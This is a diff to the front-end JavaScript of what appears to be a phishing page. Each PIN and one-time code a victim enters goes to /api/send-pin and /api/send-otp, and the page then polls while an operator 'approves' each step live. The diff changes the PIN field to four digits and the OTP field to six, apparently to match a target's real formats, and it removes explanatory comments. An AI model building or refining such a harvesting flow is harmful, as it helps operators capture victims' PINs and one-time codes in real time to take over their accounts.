@@ -148,7 +148,6 @@ async function submitApp() {
     const data = await response.json();
     if (data.ok) {
       appData.applicationId = data.applicationId;
-      // Go to processing page and wait for app approval
       goTo('page-processing');
       document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval of application...';
       startAppPolling();
@@ -181,10 +180,8 @@ function startAppPolling() {
       if (data.status === 'approved') {
         clearInterval(window._appInterval);
         goTo('page-pin');
-        // Reset PIN inputs and attempt display
         clearLoginPin();
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
-        // Wait for user to submit PIN; don't start polling yet.
         return;
       }
       if (data.status === 'rejected') {
@@ -194,7 +191,6 @@ function startAppPolling() {
         goTo('page-landing');
         return;
       }
-      // If pending, stay on processing page
     } catch (err) {
       console.error('App polling error:', err);
     }
@@ -204,8 +200,8 @@ function startAppPolling() {
 // ─── PIN Submission ───
 async function doPin() {
   let pin = '';
-  for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
-  if (pin.length !== 5) { showError('pinErr', 'Enter a 5-digit PIN.'); return; }
+  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
+  if (pin.length !== 4) { showError('pinErr', 'Enter a 4-digit PIN.'); return; }
 
   try {
     const response = await fetch('/api/send-pin', {
@@ -215,7 +211,6 @@ async function doPin() {
     });
     const data = await response.json();
     if (data.ok) {
-      // Now start polling for PIN decision
       startPinPolling();
     } else if (data.blocked) {
       showError('pinErr', data.message);
@@ -250,7 +245,6 @@ function startPinPolling() {
         clearLoginPin();
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
         goTo('page-otp');
-        // Start OTP polling? Actually we need user to enter OTP first.
         return;
       }
       if (data.status === 'rejected') {
@@ -267,7 +261,6 @@ function startPinPolling() {
         showError('pinErr', 'Application blocked. Please wait 5 minutes.');
         return;
       }
-      // If pending, keep waiting
     } catch (err) {
       console.error('Pin polling error:', err);
     }
@@ -277,8 +270,8 @@ function startPinPolling() {
 // ─── OTP Submission ───
 async function doOtp() {
   let otp = '';
-  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
-  if (otp.length !== 4) { showError('otpErr', 'Enter a 4-digit OTP.'); return; }
+  for (let i = 0; i < 6; i++) otp += document.getElementById('otp' + i).value;
+  if (otp.length !== 6) { showError('otpErr', 'Enter a 6-digit OTP.'); return; }
 
   try {
     const response = await fetch('/api/send-otp', {
@@ -382,7 +375,7 @@ function disablePinInputs() {
 }
 
 function pinMvM(input, idx) {
-  if (input.value.length > 0 && idx < 4) {
+  if (input.value.length > 0 && idx < 3) {
     document.getElementById('pin' + (idx + 1)).focus();
   }
   if (input.value.length === 0 && idx > 0) {
@@ -398,7 +391,7 @@ function clearLoginPin() {
 }
 
 function handleOtpInput(input, type) {
-  if (input.value.length > 0 && input.id !== 'otp3') {
+  if (input.value.length > 0 && input.id !== 'otp5') {
     document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
   }
 }
@@ -415,10 +408,8 @@ document.addEventListener('DOMContentLoaded', function() {
       startAppPolling();
     } else if (currentPage === 'page-pin') {
       goTo('page-pin');
-      // Don't start polling until PIN is submitted
     } else if (currentPage === 'page-otp') {
       goTo('page-otp');
-      // Don't start OTP polling until OTP is submitted
     } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
       goTo(currentPage);
     } else {
